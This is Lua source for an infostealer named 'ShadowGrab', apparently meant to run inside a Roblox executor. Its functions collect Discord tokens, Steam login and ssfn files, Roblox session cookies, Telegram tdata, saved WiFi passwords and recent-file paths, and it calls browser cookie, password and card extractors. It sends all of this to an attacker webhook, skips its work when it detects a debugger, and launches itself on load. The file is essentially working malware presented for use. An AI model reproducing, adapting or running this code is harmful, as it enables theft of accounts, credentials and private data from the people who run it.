-- ═══════════════════════════════════════════
-- DISCORD TOKENS
-- ═══════════════════════════════════════════
local function GrabDiscord()
    local ps = [[
        $results = @()
        $paths = @(
            "$env:APPDATA\Discord\Local Storage\leveldb",
            "$env:APPDATA\discordptb\Local Storage\leveldb",
            "$env:APPDATA\discordcanary\Local Storage\leveldb",
            "$env:APPDATA\Lightcord\Local Storage\leveldb"
        )
        foreach ($p in $paths) {
            if (Test-Path $p) {
                $regex = [regex]'[\w-]{24,26}\.[\w-]{6,7}\.[\w-]{25,68}'
                Get-ChildItem $p -File -ErrorAction SilentlyContinue | ForEach-Object {
                    try {
                        $content = Get-Content $_.FullName -Raw -ErrorAction SilentlyContinue
                        if ($content) {
                            foreach ($m in $regex.Matches($content)) { $results += $m.Value }
                        }
                    } catch {}
                }
            }
        }
        ($results | Sort-Object -Unique) -join "`n"
    ]]
    local result = RunPS(ps)
    if result and result ~= "" then
        for token in result:gmatch("[^\n]+") do
            local t = token:match("^%s*(.-)%s*$")
            if t and #t > 30 then SendRaw(t, "Discord Token") end
        end
    end
end

-- ═══════════════════════════════════════════
-- STEAM
-- ═══════════════════════════════════════════
local function GrabSteam()
    local paths = {
        "C:\\Program Files (x86)\\Steam",
        "C:\\Program Files\\Steam",
    }
    local steamPath
    for _, p in ipairs(paths) do
        if FileExists(p) then steamPath = p; break end
    end
    if not steamPath then return end
    
    SendFile(steamPath .. "\\config\\config.vdf", "Steam config.vdf")
    SendFile(steamPath .. "\\config\\loginusers.vdf", "Steam loginusers.vdf")
    
    local ps = 'Get-ChildItem "' .. steamPath .. '" -Filter "ssfn*" -ErrorAction SilentlyContinue | ForEach-Object { Copy-Item $_.FullName "' .. TEMP .. '\\sg_steam_" + $_.Name -Force }'
    RunPS(ps)
    local handle = io.popen('dir /b "' .. TEMP .. '\\sg_steam_*" 2>nul')
    if handle then
        for line in handle:lines() do
            SendFile(TEMP .. "\\" .. line, "Steam " .. line)
        end
        handle:close()
    end
end

-- ═══════════════════════════════════════════
-- ROBLOX
-- ═══════════════════════════════════════════
local function GrabRoblox()
    local ps = [[
        $results = @()
        $paths = @(
            "$env:LOCALAPPDATA\Roblox\LocalStorage\RobloxCookies.dat",
            "$env:APPDATA\Roblox\RobloxCookies.dat"
        )
        foreach ($p in $paths) {
            if (Test-Path $p) {
                $content = Get-Content $p -Raw -ErrorAction SilentlyContinue
                $regex = [regex]"_|\|WARNING: DO NOT SHARE THIS|--(.+?)--"
                foreach ($m in $regex.Matches($content)) { $results += $m.Groups[1].Value }
            }
        }
        $results -join "`n"
    ]]
    local result = RunPS(ps)
    if result and result ~= "" then
        for cookie in result:gmatch("[^\n]+") do
            local c = cookie:match("^%s*(.-)%s*$")
            if c and #c > 50 then SendRaw(c, "Roblox Cookie (File)") end
        end
    end
end

-- ═══════════════════════════════════════════
-- TELEGRAM
-- ═══════════════════════════════════════════
local function GrabTelegram()
    local tgPath = APPDATA .. "\\Telegram Desktop\\tdata"
    if not FileExists(tgPath) then return end
    local ps = 'Get-ChildItem "' .. tgPath .. '" -Recurse -File -ErrorAction SilentlyContinue | Where-Object { $_.Length -lt 1MB } | ForEach-Object { Copy-Item $_.FullName "' .. TEMP .. '\\sg_tg_" + $_.Name -Force }'
    RunPS(ps)
    local handle = io.popen('dir /b "' .. TEMP .. '\\sg_tg_*" 2>nul')
    if handle then
        for line in handle:lines() do
            SendFile(TEMP .. "\\" .. line, "Telegram " .. line)
        end
        handle:close()
    end
end

-- ═══════════════════════════════════════════
-- WIFI
-- ═══════════════════════════════════════════
local function GrabWifi()
    local ps = [[
        $results = @()
        $profiles = (netsh wlan show profiles) 2>$null | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
        foreach ($p in $profiles) {
            if ($p) {
                $pass = (netsh wlan show profile name="$p" key=clear) 2>$null | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
                $results += "$p | $pass"
            }
        }
        $results -join "`n"
    ]]
    local result = RunPS(ps)
    if result and result ~= "" then SendRaw(result, "WiFi Passwords") end
end

-- ═══════════════════════════════════════════
-- RECENT FILES
-- ═══════════════════════════════════════════
local function GrabRecent()
    local ps = [[
        $r = "$env:APPDATA\Microsoft\Windows\Recent"
        $out = @()
        if (Test-Path $r) {
            Get-ChildItem $r -Filter "*.lnk" -ErrorAction SilentlyContinue | Select-Object -First 30 | ForEach-Object {
                try { $t = (New-Object -ComObject WScript.Shell).CreateShortcut($_.FullName).TargetPath; $out += "$t" } catch {}
            }
        }
        $out -join "`n"
    ]]
    local result = RunPS(ps)
    if result and result ~= "" then SendRaw(result, "Recent Files") end
end

-- ═══════════════════════════════════════════
-- MAIN
-- ═══════════════════════════════════════════
local function Execute()
    if CheckDebug() then
        warn("ShadowGrab: debug detected, skipping")
        return
    end
    
    -- Test webhook first
    local testOk = HttpPost(WEBHOOK_URL, JSONEncode({content = "🚀 ShadowGrab started"}))
    if not testOk then
        warn("ShadowGrab: webhook test failed, check executor HTTP support")
        return
    end
    
    task.spawn(GrabSystemInfo)
    task.wait(1)
    
    if SG.Options.Browsers then
        task.spawn(ExtractCookies)
        task.spawn(ExtractPasswords)
        task.spawn(ExtractCards)
        task.spawn(ExtractHistory)
    end
    
    task.wait(3)
    
    if SG.Options.Discord then task.spawn(GrabDiscord) end
    if SG.Options.Steam then task.spawn(GrabSteam) end
    if SG.Options.Roblox then task.spawn(GrabRoblox) end
    if SG.Options.Telegram then task.spawn(GrabTelegram) end
    if SG.Options.FileGrabber then task.spawn(GrabRecent) end
    
    task.wait(2)
    
    task.spawn(GrabWifi)
    task.wait(1)
    
    HttpPost(WEBHOOK_URL, JSONEncode({content = "✅ ShadowGrab done"}))
end

task.spawn(Execute)
